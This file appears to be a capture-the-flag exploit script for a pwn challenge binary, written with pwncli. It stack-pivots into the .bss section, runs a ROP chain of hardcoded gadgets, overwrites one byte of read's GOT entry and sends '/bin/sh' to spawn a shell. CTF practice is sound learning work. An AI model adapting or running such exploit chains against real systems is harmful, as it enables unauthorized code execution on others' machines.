#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
import time

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c: str(c).encode()
lg = lambda s: log.info("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
debugB = lambda: input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

pop_rdi_ret = 0x00000000004007E3
pop_rsir15_ret = 0x00000000004007E1
leave_ret = 0x0000000000400712
ret = pop_rdi_ret + 1
pop_rbp_ret = 0x0000000000400570
magic_gadget = 0x0000000000400672  # mov rax, qword ptr [rbp - 8] ; mov qword ptr [rdx], rax ; nop ; pop rbp ; ret

stdin_address = elf.sym["stdin"]

read_address = elf.plt["read"]
main_address = 0x400740
got_read = elf.got["read"]

# 栈迁移
payload = b"a" * 0x10 + p64(0x601000 + 0x760)
payload += flat(
    [
        pop_rsir15_ret,
        0x601760,
        0,
        read_address,
        leave_ret,
    ]
)
s(payload)

input()
payload = flat(
    [
        0x601760,
        pop_rsir15_ret,
        0x601018,
        0,
        read_address,
        pop_rdi_ret,
        0,
        pop_rsir15_ret,
        1,
        0,
        0x400606,
        pop_rsir15_ret,
        0x601828,
        0,
        read_address,
        pop_rsir15_ret,
        0x601000 + 0xF00,
        0,
        read_address,
        pop_rdi_ret,
        0x601000 + 0xF00,
        pop_rsir15_ret,
        0,
        0,
        ret,
    ]
)
s(payload)

input()
payload = flat(
    [
        0,
        0,
        0,
        0,
        0,
        got_read,
    ]
)
s(payload)

input()
payload = p8(0xD0)
s(payload)

input()
payload = b"/bin/sh\x00".ljust(0x3B, b"a")
s(payload)

ia()
